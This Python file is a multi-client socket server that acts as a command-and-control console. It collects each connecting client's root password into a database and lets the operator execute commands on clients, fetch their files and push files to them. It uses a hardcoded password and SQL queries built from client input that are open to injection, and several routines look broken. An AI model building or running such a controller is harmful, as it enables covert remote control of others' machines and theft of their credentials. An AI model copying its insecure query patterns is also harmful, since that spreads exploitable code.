import socket, time, threading, datetime, random
import os, subprocess, atexit, sys
import logging, sqlite3
try:
    import funcy
except:
    os.system("pip install funcy")
class server():
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.IP = socket.gethostbyname(socket.gethostname())
        self.PORT = 8080
        self.server_password = "password"
        self.encoding = "latin-1"
        self.connlst, self.addrlst = [], []
        self.threads = []
        self.running = True
        self.text_color_fg = {
            "black": '\033[30m',
            "red": '\033[31m',
            "green": '\033[32m',
            "orange": '\033[33m',
            "blue": '\033[34m',
            "purple": '\033[35m',
            "cyan": '\033[36m',
            "lightgrey": '\033[37m',
            "darkgrey": '\033[90m',
            "lightred": '\033[91m',
            "lightgreen": '\033[92m',
            "yellow": '\033[93m',
            "lightblue": '\033[94m',
            "pink": '\033[95m',
            "lightcyan": '\033[96m',
            "white": '\033[99m'
        }
        self.setupfiles()
        self.setupdb()
    def setupfiles(self):
        if not os.path.exists("logs"):
            os.makedirs(f'{os.getcwd()}/logs')
            open(f'logs/{datetime.datetime.now().strftime("%m-%d-%Y")}', 'x').close()
        if not os.path.exists(f'logs/{datetime.datetime.now().strftime("%m-%d-%Y")}'):
            open(f'logs/{datetime.datetime.now().strftime("%m-%d-%Y")}', 'x').close()
        logging.basicConfig(
                filename=f'logs/{datetime.datetime.now().strftime("%m-%d-%Y")}',
                level='DEBUG',
                format="%(levelname)s  ||  %(asctime)s  ||  %(name)s: %(message)s"
            )
        logging.info("Server Finished File Setup")
    def setupdb(self):
        if os.path.exists("server.db"):
            try:
                self.sqlconnection = sqlite3.connect("server.db", check_same_thread=False)
                self.sql = self.sqlconnection.cursor()
                self.sql.execute("""
                    CREATE TABLE server(
                        status TEXT,
                        id TEXT,
                        conn TEXT,
                        addr TEXT,
                        root TEXT
                    );
                """)
            except:
                logging.info("Server Finished DB Setup")
        else:
            open("server.db", "x").close()
            self.sql = sqlite3.connect("server.db", check_same_thread=False).cursor()
            self.sql.execute("""
                CREATE TABLE server(
                    status TEXT, 
                    id TEXT,
                    conn TEXT,
                    addr TEXT,
                    root TEXT
                );
                """)
            self.setupdb()

    def start(self):
        self.s.bind((self.IP, self.PORT))
        logging.info(f"Server Started With IP: {self.IP} PORT: {self.PORT} PASSWORD: {self.server_password}")
        print(f"Server Started With IP: {self.IP} PORT: {self.PORT} PASSWORD: {self.server_password}")
        controlthread = threading.Thread(target=self.control)
        controlthread.daemon = True
        controlthread.start()
        self.threads.append(controlthread)
        while self.running:
            self.s.listen()
            conn, addr = self.s.accept()
            try:
                password = conn.recv(1024 * 5).decode(self.encoding)
                if password == self.server_password:
                    self.connlst.append(conn)
                    self.addrlst.append(addr)
                    managethread = threading.Thread(target=self.manage, args=(conn, addr))
                    managethread.daemon = True
                    managethread.start()
                    self.threads.append(managethread)
                else:
                    raise Exception("Wrong Password")
            except Exception as e:
                logging.warning(f"Connection from connection: {conn} failed, Raised with exception: {e}")
                conn.close()

    def manage(self, conn, addr):
        rootpass = conn.recv(1024*10).decode(self.encoding)
        status = "on"
        self.sql.execute("SELECT * FROM server;")
        sqldata = self.sql.fetchall()
        HaveData = False
        for i in sqldata:
            if str(conn) in i:
                HaveData = True
                self.sql.execute(f'''UPDATE server
                SET status = "on"
                WHERE conn = "{conn}" AND addr = "{addr}";
                ''')
                logging.info(f"OLD client with addr: {addr} joined with conn: {conn}")
        if HaveData == False:
            id = addr[0].replace(".", "")
            self.sql.execute(f'''INSERT INTO server (status, id, conn, addr, root)
            VALUES ("{status}", "{id}", "{conn}", "{addr}", "{rootpass}");
            ''')
            logging.info(f"NEW client with addr: {addr} joined with conn: {conn}")
        while self.running:
            try:
                pass
            except Exception as e:
                self.sql.execute(f'''UPDATE server
                SET status = "off"
                WHERE conn = "{conn}" AND addr = "{addr}";
                ''')
                logging.info(f"Client with addr: {addr} disconnected.")
                break
    def control(self):
        cmdlst = ["kick", "execute", "fetch","send", "database", "quit", "exit", "shell"]
        while self.running:
                command = input(f'{self.text_color_fg["white"]}{os.getlogin()}:>')
                split_command = command.split(" ")
                if split_command[0] == "kick" and len(split_command) == 2:
                    executed = False
                    self.sql.execute("SELECT * FROM server;")
                    sqldata = self.sql.fetchall()
                    for data in sqldata:
                        if split_command[1] in data:
                            for i in self.connlst:
                                if str(i) == data[2]:
                                    i.close()
                                    logging.info(f"ADDR: {data[3]} with CONN: {data[2]} kicked.")
                                    executed = True
                                    sqlexecute = f'''
                                    DELETE FROM server
                                    WHERE conn = "{data[2]}";
                                    '''
                                    self.sql.execute(sqlexecute)
                    if not executed:
                        print("None Kicked...")
                    else:
                        print("Command Executed...")

                if split_command[0] == "execute":
                    command = split_command[2:len(split_command)]
                    executed = False
                    self.sql.execute("SELECT * FROM server;")
                    sqldata = self.sql.fetchall()
                    for data in sqldata:
                        if split_command[1] in data and data[0] == "on":
                            for conn in self.connlst:
                                if str(conn) == data[2]:
                                    conn.send(f"execute__SPACE__{' '.join(command)}".encode(self.encoding))
                                    recv_output = b"<BYTE>"
                                    output_lst = []
                                    while recv_output:
                                        recv_output = conn.recv(1024)
                                        if '__EOFL__'.encode(self.encoding) in recv_output:
                                            output_lst.append(recv_output.decode(self.encoding).replace('__EOFL__', ''))
                                            break
                                        output_lst.append(recv_output.decode(self.encoding))
                                    print(''.join(output_lst))
                                    logging.info(f"Command: {split_command[1]} executed on machine addr: {data[1]} with output {''.join(output_lst)}.")
                                    executed = True
                        elif split_command[1] in data and data[0] == "off":
                            print(self.text_color_fg["red"], "Failed to execute command because machine is currently off.")
                    if executed == False:
                        print("Usage: execute <status, id, conn, addr, or rootpass> <command>")
                if split_command[0] == "send":
                    if len(split_command) == 3:
                        if os.path.isfile(split_command[2]):
                            self.sql.execute("SELECT * FROM server;")
                            sqldata = self.sql.fetchall()
                            for data in sqldata:
                                if split_command[1] in data and data[0] == "on":
                                    for i in self.connlst:
                                        if data[2] == str(i):
                                            conn = i
                                    conn.send(f"send__SPACE__{split_command[2]}".encode(self.encoding))
                                    with open(split_command[2], "rb") as f:
                                        bytes = list(funcy.chunks(10, f.read()))
                                        for byte in bytes:
                                            conn.send(byte)
                                        conn.send(b"__EOFL__")
                                        f.close()
                        else:
                            print("File does not exist.")
                    else:
                        print("Usage: send <status, id, conn, addr, or rootpass> <file to send>")
                if split_command[0] == "fetch":
                    if len(split_command) == 4:
                        self.sql.execute("SELECT * FROM server;")
                        sqldata = self.sql.fetchall()
                        for data in sqldata:
                            if split_command[1] in data and data[0] == "on":
                                for i in self.connlst:
                                    if data[2] == str(i):
                                        conn = i
                                conn.send(f"fetch__SPACE__{split_command[2]}".encode(self.encoding))
                                have_file = conn.recv(1024).decode(self.encoding)
                                if '__FILE_EXISTS__' in have_file:
                                    recv_data = b'<BYTE>'
                                    byte_array = []
                                    if os.path.isdir(split_command[3]):
                                        with open(f"{split_command[3]}/{split_command[2]}", "wb") as f:
                                            while recv_data:
                                                recv_data = conn.recv(1024)
                                                if b'__EOFL__' in recv_data:
                                                    byte_array.append(recv_data.replace(b'__EOFL__', b''))
                                                    break
                                                else:
                                                    byte_array.append(recv_data)
                                            f.write(b''.join(byte_array))
                                            f.close()
                                        print(f"File fetched and placed in directory {split_command[3]}.")
                                    else:
                                        print("Provided path does not exist.")
                                else:
                                    print("Desired file does not exist.")
                            elif split_command[1] in data and data[0] == "off":
                                print(self.text_color_fg["red"], "Failed to fetch file because machine is currently off.")
                    else:
                        print("Usage: fetch <status, id, conn, addr, or rootpass> <file to fetch> <Fetched file location>")
                if split_command[0] == "database" and len(split_command) == 2:
                    if len(split_command) == 2 and split_command[1] == "asc" or split_command[1] == "desc":
                        if split_command[1] == "asc":
                            self.sql.execute("SELECT * FROM server asc;")
                            sqldata = self.sql.fetchall()
                            for data in sqldata:
                                print(f"{data}")
                        elif split_command[1] == "desc":
                            self.sql.execute("SELECT * FROM server desc;")
                            sqldata = self.sql.fetchall()
                            for data in sqldata:
                                print(f"{data}")
                    elif len(split_command) != 2 or split_command[1] != "asc" or split_command[1] != "desc":
                        print("Usage: database <asc or desc>")
                if split_command[0] == "shell":
                    command = split_command[1:len(split_command)]
                    os.system(' '.join(command))
                if split_command[0] == "exit" and len(split_command) == 1 or split_command[0] == "quit" and len(split_command) == 1:
                    self.sql.execute("DELETE FROM server;")
                    self.sqlconnection.commit()
                    for i in self.threads:
                        i.alive = False
                    self.running = False
                    logging.critical("Server awaits shut down.")
                    print("Shut down protocol completed, you may close the program.")
                if command == "--help":
                    print("""
                    Client management:
                    \tkick <status, id, conn, addr, or rootpass> (close targeted client connection)
                    \texecute <status, id, conn, addr, or rootpass>  <command> (executes command in client's terminal)
                    \tfetch  <status, id, conn, addr, or rootpass> <file to fetch> <Fetched file location> (fetch client's file to targeted location)\n
                    \t send <status, id, conn, addr, or rootpass> <file to send> (send file to client(s)) 
                    Server management:
                    \tdatabase <asc or desc> (show database either by desc or asc)
                    \tshell (execute a command in shell)
                    """)
                elif split_command[0] not in cmdlst:
                    print(f"command {split_command[0]} not found, please consider using --help for the manual.")
server = server()
server.start()
